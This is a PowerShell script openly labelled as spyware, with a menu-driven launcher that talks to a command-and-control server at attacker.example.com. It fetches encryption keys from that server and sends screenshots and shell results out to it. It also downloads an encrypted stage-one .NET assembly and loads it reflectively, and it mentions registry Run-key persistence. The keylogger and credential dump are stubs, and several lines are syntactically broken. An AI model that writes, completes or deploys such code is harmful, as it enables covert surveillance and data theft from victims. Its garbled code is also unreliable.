# Spyware.ps1 - Refined launcher with ASCII UI & C2 integration
# Author: RedMind
# Persistence: HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Spyware

# ---- Configuration (replace with your C2 IP/hostname) ----
$C2Host = "attacker.example.com"   # C2 hostname/IP
$C2Port = 8080                     # Must match c2_server.py
$AESKey  = ""   #filled at runtime from /key endpoint
$AESIV   = ""

# ---- ASCII UI helpers ----
function Show-Menu {
    $host.UI.RawUI.BufferSize = New-Object System.Management.Automation.Host.Size (60,30)
    Clear-Host
    Write-Host " ========================================" -ForegroundColor Green
    Write-Host " |          RedMind Spyware v2.1        |"
    Write-Host " | 1. Start Keylogger                   |"
    Write-Host " | 2. Capture Screenshot                |"
    Write-Host " | 3. Dump Credentials                  |"
    Write-Host " | 4. Reverse Shell                     |"
    Write-Host " | 5. Launch Stage1 Reflectively        |"
    Write-Host " | 0. Exit                              |"
    Write-Host " ========================================" -ForegroundColor Green
    return Read-Host "Select option"
}

# ---- Fetch C2 key & IV ----
function Get-C2Keys {
    try {
        $resp = Invoke-RestMethod -Uri "http://$C2Host:$C2Port/key"
        $global:AESKey = [Convert]::FromBase64String($resp.key)
        $global:AESIV  = [Convert]::FromBase64String($resp.iv)
        Write-Host " [+] C2 keys retrieved" -ForegroundColor Yellow
    } catch { Write-Host " [-] C2 key fetch failed: $_" -ForegroundColor Red; exit }
}

# ---- Send encrypted result to C2 ----
function Send-Result {
    param([string]$payload)
    try {
        $enc = [Convert]::ToBase64String(([System.Security.Cryptography.Aes]::Create())
            .{ Key = $using:AESKey; IV = $using:AESIV; Mode = [System.Security.Cryptography.CipherMode]::CBC; Padding = [System.Security.Cryptography.PaddingMode]::PKCS7 }
            .CreateEncryptor()
            .TransformFinalBlock([Text.Encoding]::UTF8.GetBytes($payload),0,[$payload].Length))
        Invoke-RestMethod -Method Post -Uri "http://$C2Host:$C2Port/result/$((Get-Random))" -Body "data=$enc"
    } catch { Write-Host " [-] Exfil failed" -ForegroundColor Red }
}

# ---- Core capabilities (mirror Stage1 stubs) ----
function Start-Keylogger  { Send-Result "keystart"; }
function Stop-Keylogger   { Send-Result "keystop"; }
function Capture-Screen   { 
    Add-Type -AssemblyName System.Drawing
    $bmp = New-Object System.Drawing.Bitmap (["System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width"), (["System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height"))
    $g = [System.Drawing.Graphics]::FromImage($bmp)
    $g.CopyFromScreen($null, $null, $bmp.Size)
    $ms = New-Object System.IO.MemoryStream
    $bmp.Save($ms, [System.Drawing.Imaging.ImageFormat]::Png)
    Send-Result ("screencap:{0}" -f [Convert]::ToBase64String($ms.ToArray()))
}
function Dump-Creds { Send-Result "cred:stub" }
function Run-Shell { 
    $args = $args -join " "
    $psi = New-Object System.Diagnostics.ProcessStartInfo "cmd.exe", $args
    $psi.RedirectStandardOutput = $true; $psi.UseShellExecute = $false; $psi.CreateNoWindow = $true
    $p = [System.Diagnostics.Process]::Start($psi); $p.WaitForExit()
    Send-Result ("shellout:{0}" -f $p.ExitCode)
}

# ---- Main loop ----
Get-C2Keys
do {
    $opt = Show-Menu
    switch -regex ($opt) {
        '^[0-5]$' { }
        default { continue }
    }
    switch -Wildcard ($opt) {
        "1" { Start-Keylogger }
        "2" { Capture-Screen }
        "3" { Dump-Creds }
        "4" { $shellArgs = Read-Host "Shell command"; Run-Shell -args $shellArgs }
        "5" {
            # Reflective Stage1 launch (download + load)
            Write-Host " [+] Downloading Stage1..." -ForegroundColor Yellow
            $stage1Blob = Invoke-RestMethod -Uri "http://$C2Host:$C2Port/stage1"
            $enc = [Convert]::FromBase64String($stage1Blob)
            $iv = $enc[0..15]; $ct = $enc[16..]
            $aes = [System.Security.Cryptography.Aes]::Create()
            $aes.Key = $using:AESKey; $aes.IV = $iv; $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC; $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
            $dec = $aes.CreateDecryptor()
            $plain = $dec.TransformFinalBlock($ct,0,$ct.Length)
            $asm = [System.Reflection.Assembly]::Load($plain)
            [Stage1.Implement]::Run()  # entrypoint from Stage1.cs
        }
        "0" { break }
    }
} while ($opt -ne "0")
Write-Host " [=] Exiting. Cleanup optional." -ForegroundColor Cyan